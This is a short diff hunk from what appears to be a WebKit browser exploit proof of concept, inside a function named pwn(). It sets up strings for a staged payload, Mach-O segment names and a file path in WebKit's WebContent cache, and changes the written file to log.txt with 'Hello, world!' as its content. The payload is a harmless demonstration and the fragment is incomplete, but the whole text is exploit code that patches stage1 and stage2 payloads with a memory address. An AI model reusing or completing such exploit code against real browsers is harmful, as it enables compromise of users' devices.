@@ -408,7 +408,9 @@ function pwn() {
     writeStringToUint8Array("__TEXT", ourArray, stringsOff + 100);
     writeStringToUint8Array("__LINKEDIT", ourArray, stringsOff + 107);
     writeStringToUint8Array("HOME", ourArray, stringsOff + 118);
-    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/ABCD.txt", ourArray, stringsOff + 123);
+    writeStringToUint8Array("/Library/Caches/com.apple.WebKit.WebContent/log.txt", ourArray, stringsOff + 123);
+    writeStringToUint8Array("\n", ourArray, stringsOff + 175);
+    writeStringToUint8Array("Hello, world!\n", ourArray, stringsOff + 177);
     
     stage1.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
     stage2.replace(new Int64("0xbadbad10badbad10"), new Int64(arrayObjectAddr));
